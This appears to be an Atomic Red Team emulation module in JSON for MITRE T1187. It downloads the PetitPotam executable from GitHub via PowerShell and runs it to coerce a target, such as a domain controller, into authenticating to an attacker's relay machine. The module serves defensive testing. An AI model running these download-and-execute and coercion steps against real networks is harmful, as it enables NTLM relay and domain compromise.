{
  "id": "485ce873-2e65-4706-9c7e-ae3ab9e14213",
  "name": "PetitPotam",
  "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "9af0f374-737c-42f1-a694-d44e4058edf6",
      "type": "execute-command",
      "data": {
        "command": "\u0026 \"#{petitpotam_path}\" #{captureServerIP} #{targetServerIP} #{efsApi}\nWrite-Host \"End of PetitPotam attack\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "c31ddbd4-5423-4a03-be22-51a0c408129d",
      "name": "Check dependency 1/1",
      "description": "PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).\nAnd the computer must be domain joined (implicit authentication).\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{petitpotam_path}\") { exit 0 } else { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "64fc02f4-6be6-406f-b529-2702ca0052b0",
      "name": "Resolve dependency 1/1",
      "description": "PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).\nAnd the computer must be domain joined (implicit authentication).\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true\" -OutFile \"#{petitpotam_path}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "998b760b-2557-45de-8882-67ed8a609931",
      "name": "Re-check dependency 1/1",
      "description": "PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).\nAnd the computer must be domain joined (implicit authentication).\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{petitpotam_path}\") { exit 0 } else { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "c31ddbd4-5423-4a03-be22-51a0c408129d",
      "p": "on-success",
      "o": "9af0f374-737c-42f1-a694-d44e4058edf6"
    },
    {
      "s": "c31ddbd4-5423-4a03-be22-51a0c408129d",
      "p": "on-failure",
      "o": "64fc02f4-6be6-406f-b529-2702ca0052b0"
    },
    {
      "s": "64fc02f4-6be6-406f-b529-2702ca0052b0",
      "p": "on-success",
      "o": "998b760b-2557-45de-8882-67ed8a609931"
    },
    {
      "s": "998b760b-2557-45de-8882-67ed8a609931",
      "p": "on-failure",
      "o": "9af0f374-737c-42f1-a694-d44e4058edf6"
    }
  ],
  "tags": [
    "T1187",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "captureServerIP",
      "type": "string",
      "description": "Computer IP to use to receive the authentication (ex. attacker machine used for NTLM relay)",
      "value": "10.0.0.3"
    },
    {
      "name": "targetServerIP",
      "type": "string",
      "description": "Computer IP to force authentication from (ex. domain controller)",
      "value": "10.0.0.2"
    },
    {
      "name": "efsApi",
      "type": "integer",
      "description": "EFS API to use to coerce authentication",
      "value": "1"
    },
    {
      "name": "petitpotam_path",
      "type": "path",
      "description": "PetitPotam Windows executable",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\PetitPotam.exe"
    }
  ]
}